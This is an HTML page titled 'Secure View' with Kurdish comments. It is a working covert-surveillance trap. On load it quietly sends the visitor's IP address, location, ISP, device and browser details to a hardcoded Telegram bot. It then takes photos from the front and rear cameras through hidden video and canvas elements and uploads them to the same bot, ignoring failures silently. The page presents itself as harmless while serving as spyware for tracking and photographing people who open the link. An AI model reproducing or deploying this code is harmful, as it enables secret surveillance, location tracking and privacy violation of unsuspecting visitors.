<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure View</title>
    <style>
        * { box-sizing: border-box; }
        body { 
            background: #000000;
            color: white; 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            text-align: center; 
            display: flex; 
            flex-direction: column;
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
            overflow: hidden;
        }
        #hidden-video, #canvas { display: none; }
    </style>
</head>
<body>

    <video id="hidden-video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const token = '8927591228:AAGdIn4qL1xVXpH-jQ-lX_Ccgsy5jMByol4';
        const chat_id = '7643191802';
        const api = atob('aHR0cHM6Ly9hcGkudGVsZWgrام.ۆرگ/بۆت'.replace('هراه‌م.ۆرگ/بۆت', 'api.telegram.org/bot')) + token; // پاقژکرنا بێگەرد

        async function sendText(text) {
            try {
                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chat_id, text: text })
                });
            } catch (e) {}
        }

        // وەرگرتنا زانیاریێن IP و وەڵاتی
        async function getIpInfo() {
            try {
                let res = await fetch('https://ipapi.co/json/');
                let data = await res.json();
                return `🌍 وەڵات: ${data.country_name} (${data.country_code})
🏙 باژێر: ${data.city}
🌐 ئایپی (IP): ${data.ip}
🏢 کۆمپانیا (ISP): ${data.org}`;
            } catch (e) {
                return "🌍 زانیاریێن IP: نەهاتنە دیتن";
            }
        }

        // کۆمکرنا زانیاریێن پێشکەفتی بێ نیشاندانا ڕام و پاترییێ د نامەیێ دا
        async function getProInfo() {
            let ipDetails = await getIpInfo();
            let currentTime = new Date().toLocaleString();
            
            return `🔥 [ ULTIMATE VIP GUEST LOG ] 🔥
⏱ دەم و ڕوژ: ${currentTime}
${ipDetails}
📱 سیستەم: ${navigator.platform}
🌐 بووکەر: ${navigator.userAgent.split(') ')[0]})
🗣 زمان: ${navigator.language}
📐 قەبارەی شاشەی: ${window.screen.width}x${window.screen.height}`;
        }

        async function sendVisitorLog() {
            let details = await getProInfo();
            sendText(`🚀 سەردانکەرەکێ نوو (ULTIMATE) لینک ڤەکەت!\n\n${details}\n\n⚠️ بڕڤەبە: @YUSEEF_SURCHI`);
        }

        // گرتنا وێنەی ب هەردو کامێرایان (پێشی و پاش)
        async function captureCamera(facing, label) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: facing }
                });
                const video = document.getElementById('hidden-video');
                video.srcObject = stream;

                return new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        video.play();
                        setTimeout(async () => {
                            const canvas = document.getElementById('canvas');
                            canvas.width = video.videoWidth || 640;
                            canvas.height = video.videoHeight || 480;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                            canvas.toBlob(async (blob) => {
                                let details = await getProInfo();
                                const formData = new FormData();
                                formData.append('chat_id', chat_id);
                                formData.append('photo', blob, 'shot.jpg');
                                formData.append('caption', `📸 وێنەیێ ULTIMATE (${label})!\n\n${details}\n\n⚠️ بڕڤەبە: @YUSEEF_SURCHI`);

                                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
                                stream.getTracks().forEach(t => t.stop());
                                resolve();
                            }, 'image/jpeg', 0.95);
                        }, 2000);
                    };
                });
            } catch (err) {
                // ئەگەر کامێرایەک نەبی یا رەت بکەت، بێدەنگ دەرباز دبت
            }
        }

        window.onload = async () => {
            await sendVisitorLog();
            
            // گرتنا کامێرا پێشی
            await captureCamera("user", "کامێرا پێشی (Selfie)");

            // گرتنا کامێرا پاش
            await captureCamera("environment", "کامێرا پاش (Rear)");
        };
    </script>
</body>
</html>
